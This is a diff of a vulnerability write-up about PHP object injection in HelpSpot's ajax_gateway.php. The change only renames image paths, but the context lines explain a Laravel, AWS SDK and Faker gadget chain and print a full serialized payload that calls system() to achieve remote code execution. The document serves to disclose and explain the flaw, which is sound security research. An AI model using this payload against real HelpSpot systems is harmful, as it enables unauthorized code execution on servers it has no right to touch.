@@ -88,11 +88,11 @@ implemented and be straight to the point trying to mock this functionality
 
 **path :** 1. helpspot/helpspot/pages/ajax_gateway.php
 
-![Untitled](../ctf/images-cve/1.png)
+![Untitled](..//ctf-web/images-cve/1.png)
 
 The vulnerability exists where a POST parameter is directly passed to the **hs_unserialize** function, intended to protect against arbitrary deserialization
 
-![Untitled](../ctf/images-cve/2.png)
+![Untitled](../ctf-web/images-cve/2.png)
 
 we can see in the function defenition that’s it’s still touches `unserialize()` 
 
@@ -125,7 +125,7 @@ class A {
 hs_unserialize('O:1:"A":1:{s:3:"cmd";s:7:"success";}');
 ```
 
-![Untitled](../ctf/images-cve/3.png)
+![Untitled](../ctf-web/images-cve/3.png)
 
 **OUR GADGET CHAIN WILL BE** 
 
@@ -153,13 +153,13 @@ graph LR
 
 - __destruct method in ⇒ ./vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php.
 
-![Untitled](../ctf/images-cve/4.png)
+![Untitled](../ctf-web/images-cve/4.png)
 
 Here, you can trigger any "__call" method. Following that, I found the "__call" method in
 
 - ./vendor/laravel/framework/src/Illuminate/Collections/HigherOrderCollectionProxy.php.
 
-![Untitled](../ctf/images-cve/5.png)
+![Untitled](../ctf-web/images-cve/5.png)
 
 Here, you can trigger any method of any class, and the passed parameter is an anonymous function. 
 
@@ -167,7 +167,7 @@ So, in essence, you can invoke any class's method with arguments. At this point,
 
 - ./vendor/aws/aws-sdk-php/src/HashingStream.php.
 
-![Untitled](../ctf/images-cve/6.png)
+![Untitled](../ctf-web/images-cve/6.png)
 
 Then, the remaining steps are similar. Find a usable **`eof()`** method to bypass the **`if`** statement. Use the **`__call`** method from the **`Faker\DefaultGenerator`** class to set the value of **`$result`**. The use of **`call_user_func`** eventually leads to Remote Code Execution (RCE) . 
 
@@ -314,7 +314,7 @@ function sanitize_serialize($var, $default=[])
 sanitize_serialize('O:40:"Illuminate\Broadcasting\PendingBroadcast":3:{s:6:"events";O:45:"Illuminate\Support\HigherOrderCollectionProxy":2:{s:10:"collection";O:17:"Aws\HashingStream":3:{s:4:"hash";O:22:"Faker\DefaultGenerator":1:{s:7:"default";s:4:"ls /";}s:8:"callback";s:6:"system";s:6:"stream";O:28:"GuzzleHttp\Psr7\BufferStream":1:{s:6:"buffer";s:0:"";}}s:6:"method";s:4:"read";}s:5:"event";i:1;s:1:"a";a:0:{}}');
 ```
 
-![Untitled](../ctf/images-cve/7.png)
+![Untitled](../ctf-web/images-cve/7.png)
 
 This vulnerability arises from unsanitized input being directly passed to PHP’s unserialize() function, creating an opportunity for remote code execution (RCE) through PHP Object Injection (POI). Here’s a breakdown of how this vulnerability is exploited:
 
